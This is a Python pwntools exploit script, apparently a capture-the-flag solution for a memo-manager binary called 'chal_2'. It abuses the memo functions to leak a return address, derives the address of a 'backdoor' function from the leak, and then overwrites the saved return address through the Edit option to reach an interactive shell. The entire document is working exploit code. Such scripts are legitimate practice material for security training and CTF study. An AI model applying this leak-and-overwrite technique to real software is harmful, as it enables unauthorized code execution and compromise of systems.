from pwn import *

elf= ELF('chal_2')
r= process('./chal_2')


offset = 296
payload = b"A" * offset

# get leak
###########################
print(r.recvuntil("> "))
r.sendline("1") # Add Memo
print(r.recvuntil(": "))
r.sendline("goodluck") # pass
print(r.recvuntil(": "))
r.sendline(str(offset)) # memo size
print(r.recvuntil(": "))
r.sendline(payload) # dummy payload to leak return address
print(r.recvuntil("> "))
r.sendline("3") # View, to get leak
print(r.recvuntil(": "))
r.sendline("goodluck") # pass

resp = r.recvline().rstrip()
print(resp)
leak = resp[-8:]
leak = leak.replace(b"A", b"") # replace dummy 'A' from leak
leak = u64(leak.ljust(8, b"\x00"))
print(f"leak (main): {hex(leak)}")
BACKDOOR = leak - 827

# get SHELL
############################
offset = 32
payload = b"A" * offset
payload += p64(BACKDOOR)

print(r.recvuntil("> "))
r.sendline("2") # Edit Memo
print(r.recvuntil(": "))
r.sendline("goodluck") # pass
print(r.recvuntil(": ")) # position
r.sendline(str(1)) # memo size
print(r.recvuntil(": "))
r.sendline(payload) # payload to overwrite ret address and call backdoor()
print(r.recvuntil("> "))
r.sendline("4") # Exit, to call ret

r.interactive()
